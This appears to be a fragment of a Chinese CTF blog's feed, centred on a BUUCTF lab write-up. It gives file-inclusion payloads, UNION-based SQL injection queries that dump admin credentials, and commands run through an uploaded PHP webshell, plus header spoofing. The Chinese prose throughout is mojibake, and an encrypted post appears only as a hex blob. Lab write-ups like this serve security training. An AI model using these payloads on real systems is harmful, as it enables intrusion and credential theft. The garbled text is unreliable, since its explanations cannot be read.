æ–¹æ³•æäº¤äº†ä¸€ä¸ªè¡¨å•ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªåä¸º key çš„å­—æ®µä¸”å…¶å€¼ä¸º value_from_postï¼Œå¯ä»¥é€šè¿‡ <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] è·å–è¿™ä¸ªå€¼ã€‚<br>è®¾ç½®äº†ä¸€ä¸ªåä¸º key çš„ cookieï¼Œå…¶å€¼ä¸º value_from_cookie,å¯ä»¥ä½¿ç”¨ <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] æ¥è·å–è¿™ä¸ªå€¼ã€‚<br></code></pre></td></tr></table></figure><p>æœ‰ç‚¹å°ç´¯â€¦â€¦</p>]]></content>
    
    
    <categories>
      
      <category>è¯­è¨€</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU Basic(1)</title>
    <link href="/2024/11/07/BUUBasic-1/"/>
    <url>/2024/11/07/BUUBasic-1/</url>
    
    <content type="html"><![CDATA[<p>BUU åšçš„å‡ é“é¢˜</p><span id="more"></span><h2 id="BUU-LFI-COURSE-1"><a href="#BUU-LFI-COURSE-1" class="headerlink" title="BUU LFI COURSE 1"></a>BUU LFI COURSE 1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>æ„é€  payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">file</span>=/flag<br></code></pre></td></tr></table></figure><h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p><img src="/2024/11/06/TestWP/c-1/SQL1.png"></p><p>ç‚¹å‡» <code>æµ‹è¯•æ–°é—»1</code> ï¼Œf12 æŸ¥çœ‹çŠ¶æ€ï¼Œå‘ç°æ³¨å…¥ç‚¹ï¼Œè®¿é—®è¯·æ±‚ç½‘å€</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 æ­£å¸¸å›æ˜¾<br><span class="hljs-attribute">1</span>=2 æŠ¥é”™ï¼Œè¯´æ˜æœ‰æ³¨å…¥ç‚¹<br></code></pre></td></tr></table></figure><p>æ„é€  payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">2</span>#<br>å¾—åˆ°æ•°æ®åº“ï¼šinformation_schema,performance_schema,ctftraining,mysql,test,news<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;news&#x27;</span>),<span class="hljs-number">2</span>#<br>å¾—åˆ°æ•°æ®åº“ news ä¸‹çš„è¡¨ï¼š<span class="hljs-keyword">admin</span>,contents<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctftraining&#x27;</span>),<span class="hljs-number">2</span>#<br>å¾—åˆ°æ•°æ®åº“ ctftraining ä¸‹çš„è¡¨ï¼šFLAG_TABLE,news,users<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>),<span class="hljs-number">2</span>#<br>å¾—åˆ° <span class="hljs-keyword">admin</span> è¡¨ä¸‹çš„åˆ—åï¼šid,username,<span class="hljs-keyword">password</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">2</span>#<br>å¾—åˆ° users è¡¨ä¸‹çš„åˆ—åï¼š<span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,<span class="hljs-keyword">password</span>,ip,<span class="hljs-type">time</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(username,&quot; &quot;,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>),<span class="hljs-number">2</span>#<br>å¾—åˆ° <span class="hljs-keyword">admin</span> çš„æ•°æ®ï¼šusername=<span class="hljs-keyword">admin</span> <span class="hljs-keyword">password</span>=<span class="hljs-number">64</span>ebd6a0d676acff2c6bed36e716c9aa<br></code></pre></td></tr></table></figure><h2 id="BUU-UPLOAD-COURSE-1"><a href="#BUU-UPLOAD-COURSE-1" class="headerlink" title="BUU UPLOAD COURSE 1"></a>BUU UPLOAD COURSE 1</h2><p>æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ 11.php ï¼Œä½†æ˜¯èšå‰‘è¿æ¥ä¸äº†ï¼Œæ— è®ºä¸Šä¼ ä»€ä¹ˆéƒ½ä¼šè¢«è§£ææˆ <code>.jpg</code> æ ¼å¼</p><p>åé¢æ‰çŸ¥é“è¿™æœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ–‡ä»¶ä¸Šä¼ å’Œæ–‡ä»¶åŒ…å«ç»“åˆèµ·æ¥äº†ã€‚</p><p><code>http://4eb012d0-f5b1-4297-907d-54f47dfaddf1.node5.buuoj.cn:81/index.php?file=upload.php</code> å°† <code>upload.php</code> æ¢æˆä¸Šä¼ çš„æ–‡ä»¶çš„è·¯å¾„ï¼Œç„¶åå¯¹å…¶ post ä¼ å‚ </p><p>payloadï¼š1 æ˜¯ä¸€å¥è¯æœ¨é©¬çš„è¿æ¥å¯†ç </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;ls /&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="BUU-BURP-COURSE-1"><a href="#BUU-BURP-COURSE-1" class="headerlink" title="BUU BURP COURSE 1"></a>BUU BURP COURSE 1</h2><p>æç¤ºåªèƒ½æœ¬åœ°è®¿é—®ï¼Œæ‰€ä»¥bp æŠ“åŒ…è¿›è¡Œ <code>X-Forwarded-For</code> ä¼ªé€ </p><p>ç„¶åè¿›è¡Œ post ä¼ å‚</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=admin&amp;password=wwoj2wio2jw93ey43eiuwdjnewkndjlwe<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TestWP</title>
    <link href="/2024/11/06/TestWP/"/>
    <url>/2024/11/06/TestWP/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a826ef5974244763fa996854a6047201febeb2510035da1bd555baca5bd759a4">7f73ba022062642d898b5d3b104fc43ca083437efa339e34065fadf0421af949b4d2d043e740612ea7c4b9daae05f026e85f36c464e93978570b068cc9ac5dc92af79ebd543ee42c00b98503eae4b1824dd19dd77c11dab5f292b1e472f1c487a657ec6238bda106055641be67a181c4a4d1fb7c0350664ba8108c4fda3f8213ed7f8ab2d76bd04660ba9e7d307a41487164e344bbe81a72e00de462d643630adc8536d9cb68e85fdfb27e183d2095efdebf8fa560480055f69ed98cb32a3696f27d5f5f27cd783d7d88d21b0c5dd425f341f108f93a4341c669f841ba1f8a63c9ca40c53a76fcabfc38afee2d602dded350170e4aa4493d5e98ba9a4dfec2addc8095e24379a8b44385dc5d54e5e4a7292f217138ee115abb52616c5aea3d0f646e8c8c3bc99593f9c3ddbbfc06229314fa9b3e48610d9cfd6c8d7f9cd99d6b38a7dee540bd3521b9eb7f5d4c58ba194f43f63f40bac4d1620eb1213cac8401125d04fbd4f2e08b47a01a399b20f77346d20cbbc094c6c5917405717b011e59698d358f49383d69e30c428d6904f6a7b963b64c64de967987781083d0e8e30705f4081e3c66eaf5c7b122226f6ce93d9eb5c7bae63b1fe8eb9815b89e89193ac27ab64264ba9c07df2cf5d633765a1bd1bdbde233064873ebeb1ea19e60fe81facf907f67fae8b8e131d00762db36880257725fc6ff189379c6e647b92e3a73229c48d2525b8c96ee9e7a2937c1e6dde17f3cd3b30b624500420907e1139ba0c5220c2e7b6c8d8319729d91220870f31d90fe2fc7eb57f82df57f5c6c6b5b309db2a72ddf9d4ff4a6634aba46baef6c6123ebc649c5c3fa765bae44affaf7e7c8f8c4f10a94026a61a0bc51462c933ef81d2b24d7b530b61a1aea9ece9645ca0cab6e51e18f92dc3d5ed9305d5d9fbc6c3fb10dc3f96090e425f003bb20f73a85814baa199b0c8cc44ecc198ba4c685e7684f57fbe767b7a97fced65f8a365f5ac4a05e46833e7100ba94c9e81e972eafcb5e7701df46d804990b14937001f36a8005e2272ed8dc8503a6024c5da391b412f2d0370a65d6cfc49e952182caf8c3ae0b76ffbefa8bec208fa86ccd4d5d71efa617a04364c7177562e5f6b6186e163774b44fbab9bd0c277e65f2be3560a9f692b58f5a78ca8b09a82d9f4e3647b37c7119076679b82aab4aedaf609bddc2d1bf75922a39aaa97dd53714726c57996aef0b05337f651b97b38f9205fd4d15576a5125e2f721195f3263f12b8b1bcfe34910dffff4c5f8ba0edccc38307de3330bd9393c0675bb9b770d9471e0d36998d6d90f07365cbd4e0fb719cc539a7d0bb3b60a6e1a2da4e8b172a6b4b9a5b0b92df5168731e636b08879b51debbbb58df82fd457df8b2a9627fa0f1aaecd461d48fba2ae54dbc8aff8b063fb0ca7dd880b1f4f88f86c5abf32ba3d836b22f638aa37153f691a29e710c3ebeb50bf8f8ebd3af3c2bb6ea181a6745ea9a10f63be9cd76b7a6f7b8519de4bbcff569306fe69ddd4d32fdae153b561151bb388b6c0ff9dc1d008e1c2b45906b030a5101e0893df906b968825f1fdd9cbe1817ddc64bc239d9c123768cde2b50b84f943dc3390ed7928cef2253c4288f666a56d6a5240b1906690a77bd6cd4e9452b94f430de155cfcb7c3fd03697ac2f3b2d17e910d2fec2bf592e5f5378567c225f5bd430f2ef561eb7b3e6e6e0aad6df41950877eee1c7f657b464feebcd68e4e8c7c8439cf6343dceafe8d1784472d40fe6946fb4466e1ca36c944863be5aa72de813c3d01080c396f9f750a4fa9f952e809a03e6cbf8361f8109e4542704c277b20eb1b071a860159eaf5ada228beb9b8c461783ee2c1098cbc5714bbf4634ecf19276f0eb2b1893b608c1dd5a20472b562f2780f6735e4c5006d51bb7b27372fd94a0c54debbe303589d3837c62b5aa16a2c48c8ed622e612c038f8c8a1cb35e504cde6ab9a2205832d511ed4a3b7c4d929a06e464c98bb31e916ede2698c300702720c1984e6e4e8d28d5fef435353d5b300d4b6ab86a438d9cf7f5d2aec71f3260c9deb15e7c30c1cb890d0e1a8258440502345c25218d1f3dc98fd9fbcfe0e954825949af1346633f424236afe436369421399c421ed33926bcc01843b1429117f465b51982c0d06281b8a751211541a492e8c73f156acade5f14adbc6d3d6851d1c6484e57f766c66a57a40829c4ac9c060f2b66f17fc05e7a3710b5731c1fe718bf521839122ecbbfa3fe0767a83d2e31ecdb0fb319761e6e11c586902ee29cb828bd36f2f41a211126912a89cd8881e0fb58362c4b3a7c69d799e7b9c282dd1b3b090d725c5c023ed6c0f03cacb6a2803d2e813391e11af492895a1bbd55cd25f1ad25efe858e6af24eb3607a3449d7414e4258fe98cab1a1d260f3928cd253aecaf1c2fb8bdf3d846e9f5ddceb6846d516688c9072ccb92d27f74ad5a0a3b26ed7744ef633e3eb0c5b03a4884c3c5dbe8a7b21bc94f9144e174229b5a070d5497ac84937d34927c13b6f38fe72817c770a530ab035a9666a5214c44e2c091545e5884a519d588de36cff6b3195906be80d7aca3618ba7eade394c8c2d518b6b1937c0947681964dc11574d1925807fe83575f5a4d19be2827ff414a8e21400e330ecb6fc13ea86b61b09ce6f2b1fb29ca3afb57bdaf8a3494b1492d2144b84177405fe565f1220ac89a466d4aeacba6603c87c76cf9fc4e58b1577466dd13efb831efd80244eb17310d88c86866231a5bacf2420aef4a4e48afa54cb5a73d216e53c867c95ea5a9230fbb78e91f58b8846f15219b8e5e049c737b13d5bd7d673ff86994d4512a52e9bebdbfb4483e51c9bda1dadbe0a4e6b37c91ba4e6360470679149033a22500534bad9b7e69fca0b9644a51f33ed103f64c3b60bac16a5955ff2da39002a4913996af02e1276620ee9c774957ceb4185cdc066a7a2772e829fc9475b98290576102c8e1d565cb2c111b732b5117208de09532a22735f3826defc008c4b8d261c4744e96d61d4ede21a0e1f03370398271473e0a577136023049eaef69fef438ba7880022a7ddc37a92380aa1d4a7ba6e2005513f50493d5e8dac88726ed742e3e573fdbe0409bf5e7ffe06617b6e7baf7fb61cadcdc19c8d7bc71a0b31a238f173b36733d47a569cca34ae8d20cab978bdac002ed12ce834fd583bc75865277f01fe50bcf415a1fd7d1b29c597be58352b1f476b4a09259828487913addab29ad436143e5569484eca661396320999b858b94cf9a2b60ff9cf5dc67a1f6ed5eb9a984209ddaea9f7a692d9f1002a54080e4feb53a41830574a881fb97de7f45b3c7f48abf80bd88e7c1dda4839d678e4425749ba371414f4b669b5e2121eb1dce7b2341d0568f56dbe7aedc3053a0c26d3a52bcd3757835b72f4b6c8a208236a0e80df7c274973fb87ed4d7be9ed85b7beefa6683989f688dbda621af26ff939c1978254a3aad5cab7162d84cea0963299f56bc4e9b80f16193dc873763ed0ea66f34ed32ef6f1e411b8d6a59f5c32d5b159df9e7a954261c359d2fa5483a50ad03531f4a803d6d4ba54930dec5d13b75a1067a9bd75c54793dfc886a03fd1ff333e8a4ea1e8a662ef159f243cd63bae1c858bb0914108e8e68f9abeda31a27c9428517973a211c140321abd760f3b19928c528588a5c57a30518a2cf0ba64bfb513cdce59a61b5e3b03f541b3e7f0c9c8a8fd011b86321766d4368f2f62a11b4dabfc546f61badd537b2ead5643f61e65abd49a2e80df9a45d1d72673f3875d71f4a7bc12008f173de5a35b73009b6837b7bddfa851f938194f2911d0de8ca07f18c17d06ba3e6dc3f9f4c78a69047cb678807c88db5184f6eacf891d4e10d97e177bc9ee4ccf6f5bc48bfc3b9da081dc2328731f71d41ab117c81eafdae86a0a73a2585a93f6889dc57fcfbbc22bb6506f199c14ef4c072ea55d85bfdf200378a968c04d09e784e90f455e900d5175b4c4b569e7538431d2cd3bf96c2835cf3b239f5fcac0a6a53bb61ab679b1c7cf54ef42e4677d6f39fe3baacadcfc0e4dd6b460208ccf4d6d46fed03feb0807f7eb6dd5f48d7ad8369069d1689e1189282fbaa0d3226c606a6b8fad56201a60a9566ebc8b7b9ed494cfd4eebde5a94270240460b6014c0135d70cc164fd1a5a5450a92048f56297dc8392ee6c5737e8272421eff868dd6d62695d6e8f98e21d3bb4e2c19f4480b698ceb06ac58bb04756cf02decc4f50dddabd776da1675a55e74a35600b911e54ea0044697e9d1641c118aad00c1a0415221fabe9cf50d75e64a97cf2d4cba4c966bf043d76c11f02426a2f93bc295a0b9d42fdd3d9f1e299040bb66a2b32ca765eb464c1918aa57c8b630b304f5a38b634513cbafc371925ef78894ca7df298e8357306a5a1841f1c92a0dc8dab1ce40dc56959cf0701a8088ffc09cfe66f84522aca3695db2a98b520c6da131c9e1d511f17480c83f2c61fc7b99443cb2f1866c343936e4460d5aa9795c93c972c787d0b3307c4d629c6e88c6c0da0b30f020765c449282925ae11dc600fad2f68604aa010e0681fe95a9a4f8a5a96df94fd74a294f064c8be1e788c51f8e0b665ff600148017fb7b00a274ab457443f9a8563cc2694b9335e9f237c7a7c43f5a2e18ffe441567234affccac5a221e19ce4d38e675cc4d33c973d21fbbac68b366ef46ef0a165fb2c2aa6335b4e56ab5f03006c4561e9eb890aea40ff3a3093312a473b776a9e5282ad57858ec9bc3de5b4a38aeb19f50a799d9abb5462a9b6158265279f61e40bae49145fcbf270797d75e02c395d4a17214befb104706ff74326ddbb0ad43f109bf7689a7163292f662126c4324f1731b1c389efa717015225d5b4217499e7a3661ed89ca03df4872c5b15ac6e8a7053815d66992c2fce3433faf44103361f56c5d9abdeb8d0dd66578040e0a3a2050c5f5e605f08dc05442171929c9a7caaadc2c549e4c585cd0111c0af87c72ddc93b708fde85e4496799e1161da4e36483a8a3ca98cbd62555b4bf02a75d60e6b4d0818413f12d206281a6d6c25c7e4caed63d9aa3118b52acb3df142320515a35cf33a29b0eaec34229d5e750cfde451c84046807752eb8bab7757c335724a65be9ce37059d524b599a42178ee609224075edd7de42391b4cac152dcbc9340d6bc14763b49fb5e2bc875f558c424da71801cd6145959f6d0f2ce886554776ef44f8150a14ffdeb0ffb0be12fad2b4f2f8f621529a9d66bf2c57b7fc334491bc369508866bd98adb51180d6ddad14990faed51bb65a921e50de5b65d0e2e6932eab981483254d8917bf814c8282eed9daa8b3887d47a1d67c97aa35f7c4cf99d6e2695696def392de0e3d01e8828372c63881473243e26926e24185750efcc8bc855fd9ef3753de776a43e8e9acde542c6fdb37f1d888b40b94f90124e0ff7653873233605d2a9e99ba05b4f750c9d17b5e2b81a9b45ae9f83b96b7ddfbfdd71decae84ce72e20b8cd273b4c10f354e4b831b3dd73e58269d9c28354298555fc99e38b63fc1bfd33c791074f6c6afe4ae188e33f2f20d1c2c9494ae385e0d45a2d7462d30291c604d98eddf8e957c2b0badfadaabde49d861fcb0e8558ed7164bfd820075c005ee105e28846ac2574b1a64f318fa98b64e936aba5df76a950d7d309e363d1ec0a922e72eb76ab94900452116a19643aa053ba813cd56d7957179ad1c802f75504cd460972fcaf5a8356bdc996b1bd0a92f3c8187d93444624cccc1204cba54eb4b1bca22b22ea559965d47b0084e6c3574b854c357982ba0f7101e8d137131971b36f1d4b7d6112055e271f0645852e485eada154683100eab618dc0804d867dd8e0c6fb666725b5e926daf5ba7f9c23117f3afe79d1e665f660cab2468f5056a8e3990d1b8b7ea199101e6135e6eb3a208ac574434ff31ee14ed0b068974ae19a47ec4e98c428df80a0bb32c1dddb5c62d6ecd42093e6f99e9b200955c296203a4b82566ac272fa2e3daabae5516a1c4c4474d58d0ab10e909e0026631932939bd9ea560af3efafa1982f5a5c020db8827b6689a398149032b083c1d7e53e20b98a5082cb06d3720149267f2d36839221579fd7196871c4f577e062c80750f437bdfab903c2dc1588ea8b45227d89e46d28ee451f81664336c3d8c747f6d8908ddf73bcac792e35b9922242b6cf212350e918c9b9d6123d2ff82e0e1921e8f703bf18675260dd3e2183934e10506ed2cfbb99fb675f3cf6dfbdd6624aaeb4d54807f1e2ce7da06973151f08e5010d1189c995888ad54bdcddabac11b5dff0ef9b7aa557571dd2683ef9db7bb6c5e66afbc8f667ac876aa1e66f8016d7adb24d4415cb844535b42232175ceb68cde53469cf1af02c1dc2cb0edddc4fc44a3bf33108da82c9a2e7c7c2f0e78f113eb184ef250c3a0d9fa5989ea4ef8e6a6c1f6c8bd3f240e04ec7eb82c038f58aaa207b7cd970c8e08b607586cc01a890a15fdfea164091a4cdaab675a2fec3737fc15a51516fe32ef637b70d26d449132c4f4d22f04508b65767ef56f26c40daf17a2b3acf34e557014b7a383b4d10cf94c9e1ab71c77b0440cd38f7a1e8b5a14af5bbaac1eb09aae7aa76d523b3fbaab2e8f82c462082480a45ef5e43ca15be7ab1f35d2a5ef1b50457dcd4757d64d229b9aa97f1744493247fd0b66a15ecac63578404fdf8fc2a8512958b42888c0ea946eb6388715b058f9efdadc9f6eb6d10abe5ad8cc7df40d6a73e89e160f2c218d52ea7fff8b34047f67eef6a205f07c4134c146ba230d23436882a0f399cf2c5e84d5eeb3786aab404e40a1d3fc0e3d1cec3db45d2db6b720c93c1d720025dc533a49040f9b618277ed83f147481900f4e7de0c2ecabaf2bf992a39f1ae459411f98ef2dc933195dce8707d49f44b7fb9757383fd9fd6c05f8f2a530e00973bef8ce890620c242e741a6a3bacfd4bb5d04a6f897fc3f58236730c3e5087a9afa381c456fdb9ff30ffddb9227249f3a9c5249a2756ef516c62890fc9537f495b1b52acbf8ce470eadb4a8d3b33fa9d35cdd2ad4e9c77427822101cb872f9fec77eb0b9163f87005355c2f0700129114b9a68229b117a38e0e9d90eaf69e5970e4910ec476107e7cdc3776385c644ee3454d520c694f72f30723e0e472cca4445f9ddc3a5184762ba5a103ae92f91099276a14e42e13f208a78da1746b9979ee9fd192add6810eba69f9df27b1fb8e2147f8f1e4fbce3384def7623e0a7993b02de0461b505813e429397f21e030bbe3cc42e91b5999744b82f57d7c419a44cab55d95f14aaa9aea95e2221e97bf1ce0c0d5e4f62507043ef4a5b0bf690c24a3faa6ba2628eb9d544ef0d6bcbb087c5b57227bd58cfbd3cb1812cd97402aaf156f15c18bdfc7a78909237211a4e20f952385aedeb49207228460755a75d4e5537e3bf30c0553c7063ef4726708adf680f74ce69269bc3a35158f73b796aceb8895195bf326a0475c67083b8f93c2ab5bdb334fc7c6d945b3db69e5bebb5d306a0a073d379c1a98271edd208ca981e218a37f2c766be9aad391a2f90d80926cecc467756619c3ca8a27a6a634d6fb469f8ae8fea9b6da845ba790f93e65aae0a1e0cb85e6f6c854fa2d1f652084a953bebbf3752f10f0a24f272f65967f49fe8bfd3415bb691fc7f62cd869cb4d49625605c22a5f6bf0ed9633282e36b74e7d7afb5f6d847a91a98fe8996afc43301eda3c6aa541ef103e294fd37680e82ff230f2b6733becf40412010555b3237592e6c0e29191d110c618de2dddf0345ea3675338992728b1189c36112172332b2ce8b0455b770bc2c05d18191273fd3c4c385294dab62c73449e41c791afa45421598d86339c15643f108ae1e498292120bd6147f953c873af0fc57c4c7a10c9c0c586dc2109fcd04ad784e7a2730fd30655bf0f9029d16059c67f01b9b7d6dd08af48b67f85011a527c5c9451e4dcd300169462cb544cfe2a8a4f096d322739b718026502a48ac6949a0eefcec1ad3d221ccfe82f566f25d5db1f8fe04adcf5faea7922f17da0b86982b0085cafa9337aae6e7f925493b0cad05d45d211c260b0d360bde142b6fee3386ef2efe77b5972a67d82351fb9e9c14b2f37357e4b40bf014c702691f4b61a21269f5d60b2ae06219d5dad8c6820f44fde65431c1f22b24c14ac88eb799c852a58be3dd30d0d4ddad00d3c83271c45a23d3be3270ab190cc79e22970c3b5a3e3ba19b27ce79ca35e590f4a6bd2a0464ce825a9fa4b7ce844dc4d7ceeb30df3789df234f5ba24758826b7591e4237a9d51ba9e7645dc08b09a718f945908be9b72571e4bc44d305b5b18a41d406843344a76dd3c9e9e01312d4a3b9c2270b530769e3c48e5df8f61d0b2ad7238c2ce7c7d79d484e94c49a5761c36664163453d9272e23512844f8cc779735c258458de28ddbbbedf5b006a2d7ca088c9fbc0abb0d5bb5d0a8210db47b3e1f2c78d27c1fdaf934e0e86e6a0dead0426c726d08ff48470fa65a38ee0f94eee0c02de3a7736ea4cd58b2bf1422e6d51323f2da3457913ec35b65465d10ecf35d7d272b9bcf4d0f34b53f58bf04b31dee411f8634233fc656df0edd39b92d5284f079512b3715cc503311802b087a5f5e5364d3709918320463837cc56defc84c7be81e93874f86eba6d459d193101e29ba75e675be473d51a015908c71999b0ec2ccd73597b96219152aa8aa622c5d231c0ebb367e8fed552a0ba1875243eceae8d79fc5723afec301808bb35dc828dbd596aa8c287fd5a324f1b3cfb33ee3fa3e2455765e38685aa174af699a43d84188497b6cd510e60b14f2ab6bedfac53cb4200b0cf2687a41ef8bd70e0d5f6ec98682e0a3d4da56b6652e6c3f4a79a38079c115d57879717bd4f75a887269174a65033df9c9e5a0f17dd2ad26080b969b7d1fe521bb091d6b12d6789d16a7ca8abb199496e241fb2ef283aa5771a1665580ebf645b1942341205582bd7e85a4f41d588b7156ea58c7347c2e7e9400af99a98d0e79329217c78b5961b5ae1b9756186692d8662e2742d83775cf061cd1bf883dc7a9ab86412ecd7c79f68b952d7c72385eed1a2782b814115a9f320b26624d3ac6b3098b8dc87e64a102abfdaaaea3b5425f87a13df6175b2c5875906f06bb0c11b178454b5476c9aa18abe532fd95aaff31c132881d4bd9dc860c307343f875cb6758c324a3d685f25b2c2b2a770158dda25df85f1e9350067148871552105568d54059a54946fb80ccacabc4274d289c3597700cf06a0f86188ca31db037c595ad1f49be10ea4558d47eb5480342bb28439338ff623b842e3d99e1650abae7a0ecc5886fbccb1a08ade54f2d7e0f0aba3be17f4ec304f185f3ea631acdef27483469507a980afc2c54645b4ffd8c7ceaa0da22285d46983378463a973af78506c24588281e0278dbdc6ab66d7e8d4556a28eab16ca1d14a91fc5849a3b1e5b68261e79afa26fd5a276b8f665becb3cfed9295c5d84d5ce650622a5d681a62824f168741e75ecde99aee195697d0acb060962b1133b93970a64261d2d492d3dd5adb40bff653103b0d0f6283ca38bdcaa3066def3210735b0e967fbdd886a017d9c6b71570247c950ac9944f18fa257f1e6e196e2fc2d9488e1ec8c12b29db088bd492aa86fcbfefee4958b2f67976f5e2ab00c5e1c31ede1f4729883aeb1aa39dc40fd378f901d367818361ffbb2dbd9feeba455047382c432be6378e3077e4369488f3899cc5ae180832e2c30e3fb9630423b08434b14bd3e075bae5d5faadc170d49f6f346c2c6a20280400fe777f872647a135d46afe4e5a751a43840946bb49d6adb342a315d84da86b8bbeedbf8b0b55108562730a88dc1764ccd7264aec8cfe98ed9cebc549cf403fa684f109beb7c2bc98d93fc729bdf2db1c9f98c425c0d699e8f786580d2326f2aa344435452e9d466b090cdf5cbcf730b3a53f7328f809867b4165de975e5ada67d0168483e91b14835355c56d4caec8f28fb5cf47dbb1caeb1c36b8a468c6e0cda662eedc893ebf28fc54060b98e182058f29a855780d1e1b20452f0b7b36bb6ef7b6d91fe9e86d03ae5d9b6d00a0d7cbef0b67159a84a841fd4828b6e4514af31cd8fb202b1c36d5cd533574c343be1c1a42f1895afcce781a0129a04b428fb385a905ca0e9b682e798792e9559f0e8eb363f675fa9c425fe0826d655f1a529b591c4d18cce5d2a1403095bcd0df4e247113363d3bb6d4021b0fc54d89f8c3386069473c85a8b09cb70f98566e13a105b020b1f119c68f8082fe5d25cbfa6247c6f6f442af0373557a80ffeb9435a618959ae015eecdef8a70ef3ac050a1e497dd4450789ee1dbf739f2e797ffd3192b96b667edfd805c5f0fbccc5456767502e0f6a2536a099756f9d4f5e71e62da3dcce8982bbd5524035f68b57fbb5f7038c4a85fd7f16a66d266364e44404d4e19f05ae202f8ca5cc170fcd609ea363423f352f8cba98b964797c7742d8a9053de1da2a72c77621dc496db87507b13edb5537398553fc5facc968b0f752ce190008693c5dd236992f760c86e25ddcbc0c1facdf2a761e8cc52fdfb2554bd474d22202a082a1f51d8859c1383ad8076b7a803508731c1026fd5f0491aed6df99a9d0d2b198f4a